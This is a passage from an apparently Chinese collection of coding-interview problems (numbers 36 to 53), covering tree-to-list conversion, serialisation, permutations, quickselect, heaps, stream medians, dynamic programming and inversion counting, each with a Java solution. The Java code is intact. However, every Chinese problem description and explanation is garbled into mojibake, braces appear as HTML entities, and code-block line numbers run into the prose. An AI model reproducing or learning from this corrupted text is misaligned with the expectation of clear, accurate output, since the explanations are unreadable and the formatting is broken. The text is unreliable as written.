cur.random.next; cur = clone.next; &#125; // æ‹†åˆ† cur = pHead; RandomListNode pCloneHead = pHead.next; while (cur.next != null) &#123; RandomListNode next = cur.next; cur.next = next.next; cur = next; &#125; return pCloneHead;&#125; 36. äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨NowCoder é¢˜ç›®æè¿°è¾“å…¥ä¸€æ£µäºŒå‰æœç´¢æ ‘ï¼Œå°†è¯¥äºŒå‰æœç´¢æ ‘è½¬æ¢æˆä¸€ä¸ªæ’åºçš„åŒå‘é“¾è¡¨ã€‚è¦æ±‚ä¸èƒ½åˆ›å»ºä»»ä½•æ–°çš„ç»“ç‚¹ï¼Œåªèƒ½è°ƒæ•´æ ‘ä¸­ç»“ç‚¹æŒ‡é’ˆçš„æŒ‡å‘ã€‚ è§£é¢˜æ€è·¯12345678910111213141516171819202122private TreeNode pre = null;private TreeNode head = null;public TreeNode Convert(TreeNode root)&#123; inOrder(root); return head;&#125;private void inOrder(TreeNode node)&#123; if (node == null) return; inOrder(node.left); node.left = pre; if (pre != null) pre.right = node; pre = node; if (head == null) head = node; inOrder(node.right);&#125; 37. åºåˆ—åŒ–äºŒå‰æ ‘NowCoder é¢˜ç›®æè¿°è¯·å®ç°ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«ç”¨æ¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–äºŒå‰æ ‘ã€‚ è§£é¢˜æ€è·¯123456789101112131415161718192021222324252627282930private String deserializeStr;public String Serialize(TreeNode root)&#123; if (root == null) return "#"; return root.val + " " + Serialize(root.left) + " " + Serialize(root.right);&#125;public TreeNode Deserialize(String str)&#123; deserializeStr = str; return Deserialize();&#125;private TreeNode Deserialize()&#123; if (deserializeStr.length() == 0) return null; int index = deserializeStr.indexOf(" "); String node = index == -1 ? deserializeStr : deserializeStr.substring(0, index); deserializeStr = index == -1 ? "" : deserializeStr.substring(index + 1); if (node.equals("#")) return null; int val = Integer.valueOf(node); TreeNode t = new TreeNode(val); t.left = Deserialize(); t.right = Deserialize(); return t;&#125; 38. å­—ç¬¦ä¸²çš„æ’åˆ—NowCoder é¢˜ç›®æè¿°è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒæŒ‰å­—å…¸åºæ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²ä¸­å­—ç¬¦çš„æ‰€æœ‰æ’åˆ—ã€‚ä¾‹å¦‚è¾“å…¥å­—ç¬¦ä¸² abcï¼Œåˆ™æ‰“å°å‡ºç”±å­—ç¬¦ a, b, c æ‰€èƒ½æ’åˆ—å‡ºæ¥çš„æ‰€æœ‰å­—ç¬¦ä¸² abc, acb, bac, bca, cab å’Œ cbaã€‚ è§£é¢˜æ€è·¯123456789101112131415161718192021222324252627282930private ArrayList&lt;String&gt; ret = new ArrayList&lt;&gt;();public ArrayList&lt;String&gt; Permutation(String str)&#123; if (str.length() == 0) return ret; char[] chars = str.toCharArray(); Arrays.sort(chars); backtracking(chars, new boolean[chars.length], new StringBuilder()); return ret;&#125;private void backtracking(char[] chars, boolean[] hasUsed, StringBuilder s)&#123; if (s.length() == chars.length) &#123; ret.add(s.toString()); return; &#125; for (int i = 0; i &lt; chars.length; i++) &#123; if (hasUsed[i]) continue; if (i != 0 &amp;&amp; chars[i] == chars[i - 1] &amp;&amp; !hasUsed[i - 1]) /* ä¿è¯ä¸é‡å¤ */ continue; hasUsed[i] = true; s.append(chars[i]); backtracking(chars, hasUsed, s); s.deleteCharAt(s.length() - 1); hasUsed[i] = false; &#125;&#125; 39. æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­—NowCoder è§£é¢˜æ€è·¯å¤šæ•°æŠ•ç¥¨é—®é¢˜ï¼Œå¯ä»¥åˆ©ç”¨ Boyer-Moore Majority Vote Algorithm æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½¿å¾—æ—¶é—´å¤æ‚åº¦ä¸º O(N)ã€‚ ä½¿ç”¨ cnt æ¥ç»Ÿè®¡ä¸€ä¸ªå…ƒç´ å‡ºç°çš„æ¬¡æ•°ï¼Œå½“éå†åˆ°çš„å…ƒç´ å’Œç»Ÿè®¡å…ƒç´ ä¸ç›¸ç­‰æ—¶ï¼Œä»¤ cntâ€“ã€‚å¦‚æœå‰é¢æŸ¥æ‰¾äº† i ä¸ªå…ƒç´ ï¼Œä¸” cnt == 0 ï¼Œè¯´æ˜å‰ i ä¸ªå…ƒç´ æ²¡æœ‰ majorityï¼Œæˆ–è€…æœ‰ majorityï¼Œä½†æ˜¯å‡ºç°çš„æ¬¡æ•°å°‘äº i / 2 ï¼Œå› ä¸ºå¦‚æœå¤šäº i / 2 çš„è¯ cnt å°±ä¸€å®šä¸ä¼šä¸º 0 ã€‚æ­¤æ—¶å‰©ä¸‹çš„ n - i ä¸ªå…ƒç´ ä¸­ï¼Œmajority çš„æ•°ç›®ä¾ç„¶å¤šäº (n - i) / 2ï¼Œå› æ­¤ç»§ç»­æŸ¥æ‰¾å°±èƒ½æ‰¾å‡º majorityã€‚ 12345678910111213141516public int MoreThanHalfNum_Solution(int[] nums)&#123; int majority = nums[0]; for (int i = 1, cnt = 1; i &lt; nums.length; i++) &#123; cnt = nums[i] == majority ? cnt + 1 : cnt - 1; if (cnt == 0) &#123; majority = nums[i]; cnt = 1; &#125; &#125; int cnt = 0; for (int val : nums) if (val == majority) cnt++; return cnt &gt; nums.length / 2 ? majority : 0;&#125; 40. æœ€å°çš„ K ä¸ªæ•°NowCoder è§£é¢˜æ€è·¯å¿«é€Ÿé€‰æ‹© å¤æ‚åº¦ï¼šO(N) + O(1) åªæœ‰å½“å…è®¸ä¿®æ”¹æ•°ç»„å…ƒç´ æ—¶æ‰å¯ä»¥ä½¿ç”¨ å¿«é€Ÿæ’åºçš„ partition() æ–¹æ³•ï¼Œä¼šè¿”å›ä¸€ä¸ªæ•´æ•° j ä½¿å¾— a[l..j-1] å°äºç­‰äº a[j]ï¼Œä¸” a[j+1..h] å¤§äºç­‰äº a[j]ï¼Œæ­¤æ—¶ a[j] å°±æ˜¯æ•°ç»„çš„ç¬¬ j å¤§å…ƒç´ ã€‚å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ‰¾å‡ºæ•°ç»„çš„ç¬¬ K ä¸ªå…ƒç´ ï¼Œè¿™ç§æ‰¾ç¬¬ K ä¸ªå…ƒç´ çš„ç®—æ³•ç§°ä¸ºå¿«é€Ÿé€‰æ‹©ç®—æ³•ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public ArrayList&lt;Integer&gt; GetLeastNumbers_Solution(int[] nums, int k)&#123; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); if (k &gt; nums.length || k &lt;= 0) return ret; findKthSmallest(nums, k - 1); /* findKthSmallest ä¼šæ”¹å˜æ•°ç»„ï¼Œä½¿å¾—å‰ k ä¸ªæ•°éƒ½æ˜¯æœ€å°çš„ k ä¸ªæ•° */ for (int i = 0; i &lt; k; i++) ret.add(nums[i]); return ret;&#125;public void findKthSmallest(int[] nums, int k)&#123; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int j = partition(nums, l, h); if (j == k) break; if (j &gt; k) h = j - 1; else l = j + 1; &#125;&#125;private int partition(int[] nums, int l, int h)&#123; int p = nums[l]; /* åˆ‡åˆ†å…ƒç´  */ int i = l, j = h + 1; while (true) &#123; while (i != h &amp;&amp; nums[++i] &lt; p) ; while (j != l &amp;&amp; nums[--j] &gt; p) ; if (i &gt;= j) break; swap(nums, i, j); &#125; swap(nums, l, j); return j;&#125;private void swap(int[] nums, int i, int j)&#123; int t = nums[i]; nums[i] = nums[j]; nums[j] = t;&#125; å¤§å°ä¸º K çš„æœ€å°å † å¤æ‚åº¦ï¼šO(NlogK) + O(K) ç‰¹åˆ«é€‚åˆå¤„ç†æµ·é‡æ•°æ® åº”è¯¥ä½¿ç”¨å¤§é¡¶å †æ¥ç»´æŠ¤æœ€å°å †ï¼Œè€Œä¸èƒ½ç›´æ¥åˆ›å»ºä¸€ä¸ªå°é¡¶å †å¹¶è®¾ç½®ä¸€ä¸ªå¤§å°ï¼Œä¼å›¾è®©å°é¡¶å †ä¸­çš„å…ƒç´ éƒ½æ˜¯æœ€å°å…ƒç´ ã€‚ ç»´æŠ¤ä¸€ä¸ªå¤§å°ä¸º K çš„æœ€å°å †è¿‡ç¨‹å¦‚ä¸‹ï¼šåœ¨æ·»åŠ ä¸€ä¸ªå…ƒç´ ä¹‹åï¼Œå¦‚æœå¤§é¡¶å †çš„å¤§å°å¤§äº Kï¼Œé‚£ä¹ˆéœ€è¦å°†å¤§é¡¶å †çš„å †é¡¶å…ƒç´ å»é™¤ã€‚ 123456789101112public ArrayList&lt;Integer&gt; GetLeastNumbers_Solution(int[] nums, int k)&#123; if (k &gt; nums.length || k &lt;= 0) return new ArrayList&lt;&gt;(); PriorityQueue&lt;Integer&gt; maxHeap = new PriorityQueue&lt;&gt;((o1, o2) -&gt; o2 - o1); for (int num : nums) &#123; maxHeap.add(num); if (maxHeap.size() &gt; k) maxHeap.poll(); &#125; return new ArrayList&lt;&gt;(maxHeap) ;&#125; 41.1 æ•°æ®æµä¸­çš„ä¸­ä½æ•°NowCoder é¢˜ç›®æè¿°å¦‚ä½•å¾—åˆ°ä¸€ä¸ªæ•°æ®æµä¸­çš„ä¸­ä½æ•°ï¼Ÿå¦‚æœä»æ•°æ®æµä¸­è¯»å‡ºå¥‡æ•°ä¸ªæ•°å€¼ï¼Œé‚£ä¹ˆä¸­ä½æ•°å°±æ˜¯æ‰€æœ‰æ•°å€¼æ’åºä¹‹åä½äºä¸­é—´çš„æ•°å€¼ã€‚å¦‚æœä»æ•°æ®æµä¸­è¯»å‡ºå¶æ•°ä¸ªæ•°å€¼ï¼Œé‚£ä¹ˆä¸­ä½æ•°å°±æ˜¯æ‰€æœ‰æ•°å€¼æ’åºä¹‹åä¸­é—´ä¸¤ä¸ªæ•°çš„å¹³å‡å€¼ã€‚ è§£é¢˜æ€è·¯123456789101112131415161718192021222324252627282930/* å¤§é¡¶å †ï¼Œå­˜å‚¨å·¦åŠè¾¹å…ƒç´  */private PriorityQueue&lt;Integer&gt; left = new PriorityQueue&lt;&gt;((o1, o2) -&gt; o2 - o1);/* å°é¡¶å †ï¼Œå­˜å‚¨å³åŠè¾¹å…ƒç´ ï¼Œå¹¶ä¸”å³åŠè¾¹å…ƒç´ éƒ½å¤§äºå·¦åŠè¾¹ */private PriorityQueue&lt;Integer&gt; right = new PriorityQueue&lt;&gt;();/* å½“å‰æ•°æ®æµè¯»å…¥çš„å…ƒç´ ä¸ªæ•° */private int N = 0;public void Insert(Integer val)&#123; /* æ’å…¥è¦ä¿è¯ä¸¤ä¸ªå †å­˜äºå¹³è¡¡çŠ¶æ€ */ if (N % 2 == 0) &#123; /* N ä¸ºå¶æ•°çš„æƒ…å†µä¸‹æ’å…¥åˆ°å³åŠè¾¹ã€‚ * å› ä¸ºå³åŠè¾¹å…ƒç´ éƒ½è¦å¤§äºå·¦åŠè¾¹ï¼Œä½†æ˜¯æ–°æ’å…¥çš„å…ƒç´ ä¸ä¸€å®šæ¯”å·¦åŠè¾¹å…ƒç´ æ¥çš„å¤§ï¼Œ * å› æ­¤éœ€è¦å…ˆå°†å…ƒç´ æ’å…¥å·¦åŠè¾¹ï¼Œç„¶ååˆ©ç”¨å·¦åŠè¾¹ä¸ºå¤§é¡¶å †çš„ç‰¹ç‚¹ï¼Œå–å‡ºå †é¡¶å…ƒç´ å³ä¸ºæœ€å¤§å…ƒç´ ï¼Œæ­¤æ—¶æ’å…¥å³åŠè¾¹ */ left.add(val); right.add(left.poll()); &#125; else &#123; right.add(val); left.add(right.poll()); &#125; N++;&#125;public Double GetMedian()&#123; if (N % 2 == 0) return (left.peek() + right.peek()) / 2.0; else return (double) right.peek();&#125; 41.2 å­—ç¬¦æµä¸­ç¬¬ä¸€ä¸ªä¸é‡å¤çš„å­—ç¬¦NowCoder é¢˜ç›®æè¿°è¯·å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥æ‰¾å‡ºå­—ç¬¦æµä¸­ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œå½“ä»å­—ç¬¦æµä¸­åªè¯»å‡ºå‰ä¸¤ä¸ªå­—ç¬¦ â€œgoâ€ æ—¶ï¼Œç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦æ˜¯ â€œgâ€ã€‚å½“ä»è¯¥å­—ç¬¦æµä¸­è¯»å‡ºå‰å…­ä¸ªå­—ç¬¦â€œgoogleâ€ æ—¶ï¼Œç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦æ˜¯ â€œlâ€ã€‚ è§£é¢˜æ€è·¯123456789101112131415private int[] cnts = new int[256];private Queue&lt;Character&gt; queue = new LinkedList&lt;&gt;();public void Insert(char ch)&#123; cnts[ch]++; queue.add(ch); while (!queue.isEmpty() &amp;&amp; cnts[queue.peek()] &gt; 1) queue.poll();&#125;public char FirstAppearingOnce()&#123; return queue.isEmpty() ? '#' : queue.peek();&#125; 42. è¿ç»­å­æ•°ç»„çš„æœ€å¤§å’ŒNowCoder é¢˜ç›®æè¿°{6,-3,-2,7,-15,1,2,2}ï¼Œè¿ç»­å­æ•°ç»„çš„æœ€å¤§å’Œä¸º 8ï¼ˆä»ç¬¬ 0 ä¸ªå¼€å§‹ï¼Œåˆ°ç¬¬ 3 ä¸ªä¸ºæ­¢ï¼‰ã€‚ è§£é¢˜æ€è·¯123456789101112public int FindGreatestSumOfSubArray(int[] nums)&#123; if (nums == null || nums.length == 0) return 0; int greatestSum = Integer.MIN_VALUE; int sum = 0; for (int val : nums) &#123; sum = sum &lt;= 0 ? val : sum + val; greatestSum = Math.max(greatestSum, sum); &#125; return greatestSum;&#125; 43. ä» 1 åˆ° n æ•´æ•°ä¸­ 1 å‡ºç°çš„æ¬¡æ•°NowCoder è§£é¢˜æ€è·¯123456789public int NumberOf1Between1AndN_Solution(int n)&#123; int cnt = 0; for (int m = 1; m &lt;= n; m *= 10) &#123; int a = n / m, b = n % m; cnt += (a + 8) / 10 * m + (a % 10 == 1 ? b + 1 : 0); &#125; return cnt;&#125; Leetcode : 233. Number of Digit One-C++JavaPython) 44. æ•°å­—åºåˆ—ä¸­çš„æŸä¸€ä½æ•°å­—é¢˜ç›®æè¿°æ•°å­—ä»¥ 0123456789101112131415â€¦ çš„æ ¼å¼åºåˆ—åŒ–åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œæ±‚è¿™ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ index ä½ã€‚ è§£é¢˜æ€è·¯123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public int getDigitAtIndex(int index)&#123; if (index &lt; 0) return -1; int place = 1; // ä½æ•°ï¼Œ1 è¡¨ç¤ºä¸ªä½ï¼Œ2 è¡¨ç¤º åä½... while (true) &#123; int amount = getAmountOfPlace(place); int totalAmount = amount * place; if (index &lt; totalAmount) return getDigitAtIndex(index, place); index -= totalAmount; place++; &#125;&#125;/** * place ä½æ•°çš„æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²é•¿åº¦ * 10, 90, 900, ... */private int getAmountOfPlace(int place)&#123; if (place == 1) return 10; return (int) Math.pow(10, place - 1) * 9;&#125;/** * place ä½æ•°çš„èµ·å§‹æ•°å­— * 0, 10, 100, ... */private int getBeginNumberOfPlace(int place)&#123; if (place == 1) return 0; return (int) Math.pow(10, place - 1);&#125;/** * åœ¨ place ä½æ•°ç»„æˆçš„å­—ç¬¦ä¸²ä¸­ï¼Œç¬¬ index ä¸ªæ•° */private int getDigitAtIndex(int index, int place)&#123; int beginNumber = getBeginNumberOfPlace(place); int shiftNumber = index / place; String number = (beginNumber + shiftNumber) + ""; int count = index % place; return number.charAt(count) - '0';&#125; 45. æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•°NowCoder é¢˜ç›®æè¿°è¾“å…¥ä¸€ä¸ªæ­£æ•´æ•°æ•°ç»„ï¼ŒæŠŠæ•°ç»„é‡Œæ‰€æœ‰æ•°å­—æ‹¼æ¥èµ·æ¥æ’æˆä¸€ä¸ªæ•°ï¼Œæ‰“å°èƒ½æ‹¼æ¥å‡ºçš„æ‰€æœ‰æ•°å­—ä¸­æœ€å°çš„ä¸€ä¸ªã€‚ä¾‹å¦‚è¾“å…¥æ•°ç»„ {3ï¼Œ32ï¼Œ321}ï¼Œåˆ™æ‰“å°å‡ºè¿™ä¸‰ä¸ªæ•°å­—èƒ½æ’æˆçš„æœ€å°æ•°å­—ä¸º 321323ã€‚ è§£é¢˜æ€è·¯å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªæ’åºé—®é¢˜ï¼Œåœ¨æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸² S1 å’Œ S2 çš„å¤§å°æ—¶ï¼Œåº”è¯¥æ¯”è¾ƒçš„æ˜¯ S1+S2 å’Œ S2+S1 çš„å¤§å°ï¼Œå¦‚æœ S1+S2 &lt; S2+S1ï¼Œé‚£ä¹ˆåº”è¯¥æŠŠ S1 æ’åœ¨å‰é¢ï¼Œå¦åˆ™åº”è¯¥æŠŠ S2 æ’åœ¨å‰é¢ã€‚ 1234567891011121314public String PrintMinNumber(int[] numbers)&#123; if (numbers == null || numbers.length == 0) return ""; int n = numbers.length; String[] nums = new String[n]; for (int i = 0; i &lt; n; i++) nums[i] = numbers[i] + ""; Arrays.sort(nums, (s1, s2) -&gt; (s1 + s2).compareTo(s2 + s1)); String ret = ""; for (String str : nums) ret += str; return ret;&#125; 46. æŠŠæ•°å­—ç¿»è¯‘æˆå­—ç¬¦ä¸²Leetcode é¢˜ç›®æè¿°ç»™å®šä¸€ä¸ªæ•°å­—ï¼ŒæŒ‰ç…§å¦‚ä¸‹è§„åˆ™ç¿»è¯‘æˆå­—ç¬¦ä¸²ï¼š0 ç¿»è¯‘æˆâ€œaâ€ï¼Œ1 ç¿»è¯‘æˆâ€œbâ€â€¦ 25 ç¿»è¯‘æˆâ€œzâ€ã€‚ä¸€ä¸ªæ•°å­—æœ‰å¤šç§ç¿»è¯‘å¯èƒ½ï¼Œä¾‹å¦‚ 12258 ä¸€å…±æœ‰ 5 ç§ï¼Œåˆ†åˆ«æ˜¯ bccfiï¼Œbwfiï¼Œbcziï¼Œmcfiï¼Œmziã€‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥è®¡ç®—ä¸€ä¸ªæ•°å­—æœ‰å¤šå°‘ç§ä¸åŒçš„ç¿»è¯‘æ–¹æ³•ã€‚ è§£é¢˜æ€è·¯1234567891011121314151617181920public int numDecodings(String s)&#123; if (s == null || s.length() == 0) return 0; int n = s.length(); int[] dp = new int[n + 1]; dp[0] = 1; dp[1] = s.charAt(0) == '0' ? 0 : 1; for (int i = 2; i &lt;= n; i++) &#123; int one = Integer.valueOf(s.substring(i - 1, i)); if (one != 0) dp[i] += dp[i - 1]; if (s.charAt(i - 2) == '0') continue; int two = Integer.valueOf(s.substring(i - 2, i)); if (two &lt;= 26) dp[i] += dp[i - 2]; &#125; return dp[n];&#125; 47. ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼NowCoder é¢˜ç›®æè¿°åœ¨ä¸€ä¸ª m*n çš„æ£‹ç›˜çš„æ¯ä¸€ä¸ªæ ¼éƒ½æ”¾æœ‰ä¸€ä¸ªç¤¼ç‰©ï¼Œæ¯ä¸ªç¤¼ç‰©éƒ½æœ‰ä¸€å®šä»·å€¼ï¼ˆå¤§äº 0ï¼‰ã€‚ä»å·¦ä¸Šè§’å¼€å§‹æ‹¿ç¤¼ç‰©ï¼Œæ¯æ¬¡å‘å³æˆ–å‘ä¸‹ç§»åŠ¨ä¸€æ ¼ï¼Œç›´åˆ°å³ä¸‹è§’ç»“æŸã€‚ç»™å®šä¸€ä¸ªæ£‹ç›˜ï¼Œæ±‚æ‹¿åˆ°ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼ã€‚ä¾‹å¦‚ï¼Œå¯¹äºå¦‚ä¸‹æ£‹ç›˜ 12341 10 3 812 2 9 65 7 4 113 7 16 5 ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼ä¸º 1+12+5+7+7+16+5=53ã€‚ è§£é¢˜æ€è·¯åº”è¯¥ç”¨åŠ¨æ€è§„åˆ’æ±‚è§£ï¼Œè€Œä¸æ˜¯æ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œæ·±åº¦ä¼˜å…ˆæœç´¢è¿‡äºå¤æ‚ï¼Œä¸æ˜¯æœ€ä¼˜è§£ã€‚ 12345678910111213public int getMost(int[][] values)&#123; if (values == null || values.length == 0 || values[0].length == 0) return 0; int n = values[0].length; int[] dp = new int[n]; for (int[] value : values) &#123; dp[0] += value[0]; for (int i = 1; i &lt; n; i++) dp[i] = Math.max(dp[i], dp[i - 1]) + value[i]; &#125; return dp[n - 1];&#125; 48. æœ€é•¿ä¸å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦ä¸²é¢˜ç›®æè¿°è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆåªåŒ…å« a~z çš„å­—ç¬¦ï¼‰ï¼Œæ±‚å…¶æœ€é•¿ä¸å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ä¾‹å¦‚å¯¹äº arabcacfrï¼Œæœ€é•¿ä¸å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦ä¸²ä¸º acfrï¼Œé•¿åº¦ä¸º 4ã€‚ è§£é¢˜æ€è·¯1234567891011121314151617181920public int longestSubStringWithoutDuplication(String str)&#123; int curLen = 0; int maxLen = 0; int[] preIndexs = new int[26]; Arrays.fill(preIndexs, -1); for (int curI = 0; curI &lt; str.length(); curI++) &#123; int c = str.charAt(curI) - 'a'; int preI = preIndexs[c]; if (preI == -1 || curI - preI &gt; curLen) &#123; curLen++; &#125; else &#123; maxLen = Math.max(maxLen, curLen); curLen = curI - preI; &#125; preIndexs[c] = curI; &#125; maxLen = Math.max(maxLen, curLen); return maxLen;&#125; 49. ä¸‘æ•°NowCoder é¢˜ç›®æè¿°æŠŠåªåŒ…å«å› å­ 2ã€3 å’Œ 5 çš„æ•°ç§°ä½œä¸‘æ•°ï¼ˆUgly Numberï¼‰ã€‚ä¾‹å¦‚ 6ã€8 éƒ½æ˜¯ä¸‘æ•°ï¼Œä½† 14 ä¸æ˜¯ï¼Œå› ä¸ºå®ƒåŒ…å«å› å­ 7ã€‚ä¹ æƒ¯ä¸Šæˆ‘ä»¬æŠŠ 1 å½“åšæ˜¯ç¬¬ä¸€ä¸ªä¸‘æ•°ã€‚æ±‚æŒ‰ä»å°åˆ°å¤§çš„é¡ºåºçš„ç¬¬ N ä¸ªä¸‘æ•°ã€‚ è§£é¢˜æ€è·¯12345678910111213141516171819public int GetUglyNumber_Solution(int N)&#123; if (N &lt;= 6) return N; int i2 = 0, i3 = 0, i5 = 0; int[] dp = new int[N]; dp[0] = 1; for (int i = 1; i &lt; N; i++) &#123; int next2 = dp[i2] * 2, next3 = dp[i3] * 3, next5 = dp[i5] * 5; dp[i] = Math.min(next2, Math.min(next3, next5)); if (dp[i] == next2) i2++; if (dp[i] == next3) i3++; if (dp[i] == next5) i5++; &#125; return dp[N - 1];&#125; 50. ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ä½ç½®NowCoder é¢˜ç›®æè¿°åœ¨ä¸€ä¸ªå­—ç¬¦ä¸² (1 &lt;= å­—ç¬¦ä¸²é•¿åº¦ &lt;= 10000ï¼Œå…¨éƒ¨ç”±å­—æ¯ç»„æˆ) ä¸­æ‰¾åˆ°ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ï¼Œå¹¶è¿”å›å®ƒçš„ä½ç½®ã€‚ è§£é¢˜æ€è·¯æœ€ç›´è§‚çš„è§£æ³•æ˜¯ä½¿ç”¨ HashMap å¯¹å‡ºç°æ¬¡æ•°è¿›è¡Œç»Ÿè®¡ï¼Œä½†æ˜¯è€ƒè™‘åˆ°è¦ç»Ÿè®¡çš„å­—ç¬¦èŒƒå›´æœ‰é™ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨æ•´å‹æ•°ç»„ä»£æ›¿ HashMapã€‚ 12345678910public int FirstNotRepeatingChar(String str)&#123; int[] cnts = new int[256]; for (int i = 0; i &lt; str.length(); i++) cnts[str.charAt(i)]++; for (int i = 0; i &lt; str.length(); i++) if (cnts[str.charAt(i)] == 1) return i; return -1;&#125; ä»¥ä¸Šå®ç°çš„ç©ºé—´å¤æ‚åº¦è¿˜ä¸æ˜¯æœ€ä¼˜çš„ã€‚è€ƒè™‘åˆ°åªéœ€è¦æ‰¾åˆ°åªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ç»Ÿè®¡çš„æ¬¡æ•°ä¿¡æ¯åªæœ‰ 0,1,æ›´å¤§ï¼Œä½¿ç”¨ä¸¤ä¸ªæ¯”ç‰¹ä½å°±èƒ½å­˜å‚¨è¿™äº›ä¿¡æ¯ã€‚ 1234567891011121314151617public int FirstNotRepeatingChar2(String str)&#123; BitSet bs1 = new BitSet(256); BitSet bs2 = new BitSet(256); for (char c : str.toCharArray()) &#123; if (!bs1.get(c) &amp;&amp; !bs2.get(c)) bs1.set(c); // 0 0 -&gt; 0 1 else if (bs1.get(c) &amp;&amp; !bs2.get(c)) bs2.set(c); // 0 1 -&gt; 1 1 &#125; for (int i = 0; i &lt; str.length(); i++) &#123; char c = str.charAt(i); if (bs1.get(c) &amp;&amp; !bs2.get(c)) // 0 1 return i; &#125; return -1;&#125; 51. æ•°ç»„ä¸­çš„é€†åºå¯¹NowCoder é¢˜ç›®æè¿°åœ¨æ•°ç»„ä¸­çš„ä¸¤ä¸ªæ•°å­—ï¼Œå¦‚æœå‰é¢ä¸€ä¸ªæ•°å­—å¤§äºåé¢çš„æ•°å­—ï¼Œåˆ™è¿™ä¸¤ä¸ªæ•°å­—ç»„æˆä¸€ä¸ªé€†åºå¯¹ã€‚è¾“å…¥ä¸€ä¸ªæ•°ç»„ï¼Œæ±‚å‡ºè¿™ä¸ªæ•°ç»„ä¸­çš„é€†åºå¯¹çš„æ€»æ•° Pã€‚ è§£é¢˜æ€è·¯123456789101112131415161718192021222324252627282930313233343536373839private long cnt = 0;private int[] tmp; // åœ¨è¿™é‡Œåˆ›å»ºè¾…åŠ©æ•°ç»„ï¼Œè€Œä¸æ˜¯åœ¨ merge() é€’å½’å‡½æ•°ä¸­åˆ›å»ºpublic int InversePairs(int[] nums)&#123; tmp = new int[nums.length]; mergeSort(nums, 0, nums.length - 1); return (int) (cnt % 1000000007);&#125;private void mergeSort(int[] nums, int l, int h)&#123; if (h - l &lt; 1) return; int m = l + (h - l) / 2; mergeSort(nums, l, m); mergeSort(nums, m + 1, h); merge(nums, l, m, h);&#125;private void merge(int[] nums, int l, int m, int h)&#123; int i = l, j = m + 1, k = l; while (i &lt;= m || j &lt;= h) &#123; if (i &gt; m) tmp[k] = nums[j++]; else if (j &gt; h) tmp[k] = nums[i++]; else if (nums[i] &lt; nums[j]) tmp[k] = nums[i++]; else &#123; tmp[k] = nums[j++]; this.cnt += m - i + 1; // nums[i] &gt;= nums[j]ï¼Œè¯´æ˜ nums[i...mid] éƒ½å¤§äº nums[j] &#125; k++; &#125; for (k = l; k &lt;= h; k++) nums[k] = tmp[k];&#125; 52. ä¸¤ä¸ªé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…¬å…±ç»“ç‚¹NowCoder é¢˜ç›®æè¿° è§£é¢˜æ€è·¯è®¾ A çš„é•¿åº¦ä¸º a + cï¼ŒB çš„é•¿åº¦ä¸º b + cï¼Œå…¶ä¸­ c ä¸ºå°¾éƒ¨å…¬å…±éƒ¨åˆ†é•¿åº¦ï¼Œå¯çŸ¥ a + c + b = b + c + aã€‚ å½“è®¿é—® A é“¾è¡¨çš„æŒ‡é’ˆè®¿é—®åˆ°é“¾è¡¨å°¾éƒ¨æ—¶ï¼Œä»¤å®ƒä»é“¾è¡¨ B çš„å¤´éƒ¨é‡æ–°å¼€å§‹è®¿é—®é“¾è¡¨ Bï¼›åŒæ ·åœ°ï¼Œå½“è®¿é—® B é“¾è¡¨çš„æŒ‡é’ˆè®¿é—®åˆ°é“¾è¡¨å°¾éƒ¨æ—¶ï¼Œä»¤å®ƒä»é“¾è¡¨ A çš„å¤´éƒ¨é‡æ–°å¼€å§‹è®¿é—®é“¾è¡¨ Aã€‚è¿™æ ·å°±èƒ½æ§åˆ¶è®¿é—® A å’Œ B ä¸¤ä¸ªé“¾è¡¨çš„æŒ‡é’ˆèƒ½åŒæ—¶è®¿é—®åˆ°äº¤ç‚¹ã€‚ 123456789public ListNode FindFirstCommonNode(ListNode pHead1, ListNode pHead2)&#123; ListNode l1 = pHead1, l2 = pHead2; while (l1 != l2) &#123; l1 = (l1 == null) ? pHead2 : l1.next; l2 = (l2 == null) ? pHead1 : l2.next; &#125; return l1;&#125; 53 æ•°å­—åœ¨æ’åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°NowCoder é¢˜ç›®æè¿°12345Input:1, 2, 3, 3, 3, 3, 4, 63Output:4 è§£é¢˜æ€è·¯12345678910111213141516171819public int GetNumberOfK(int[] nums, int 